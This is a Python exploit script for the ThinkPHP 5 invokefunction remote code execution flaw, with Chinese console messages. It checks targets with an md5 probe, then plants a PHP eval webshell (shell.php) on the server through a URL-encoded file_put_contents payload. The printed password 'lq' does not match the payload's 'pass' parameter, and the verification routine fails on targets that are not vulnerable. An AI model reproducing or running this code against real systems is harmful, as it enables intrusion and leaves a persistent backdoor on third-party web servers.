import argparse
import re
import sys
import urllib

import requests


def verify(url):
    relsult = {
        'name': 'Thinkphp 5 rce',
        'vulnerable': False,
        'attack': True,
    }
    try:
        payload = urllib.parse.urljoin(url,r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1')
        response = requests.get(payload, timeout=3)
        if re.search(r'c4ca4238a0b923820dcc509a6f75849b', response.text):
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = url
            relsult['payload'] = payload
            relsult['attack'] = True
        return relsult
    except:
        return relsult


def attack(url):
    try:
        print('开始利用tp5rce')
        payload = r'/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%70%61%73%73%27%5d%29%3b%3f%3e'
        webshell = urllib.parse.urljoin(url, payload)
        if requests.get(webshell, timeout=10).status_code == 200:
            print('webshell地址为: ' +str(url)+'/shell.php' )
            print('密码:lq')
            return True
        else:
            return False
    except:
        return False


def start_verify(self):
    s2 = verify(self)
    print(s2['name'] + str(' ' + str(s2['vulnerable'])))
    print('payload: ' + str(s2['payload']))
    print('attack: ' + str(s2['attack']))


if __name__ == '__main__':
    print('''--❤ tp2rce_scan ❤--''')

parser = argparse.ArgumentParser(description='tp2rce')
parser.add_argument('-url', type=str, help="输入目标链接")
parser.add_argument('-attack', type=str, help='执行EXP')
args = parser.parse_args()

try:
    if '-url' in sys.argv:
        print('漏洞检测')
        print()
        start_verify(args.url)
        print()
        print('漏洞检测结束')
    if '-attack' in sys.argv:
        print('漏洞利用')
        print()
        attack(args.attack)
        print()
        print('漏洞利用结束')
except:
    pass
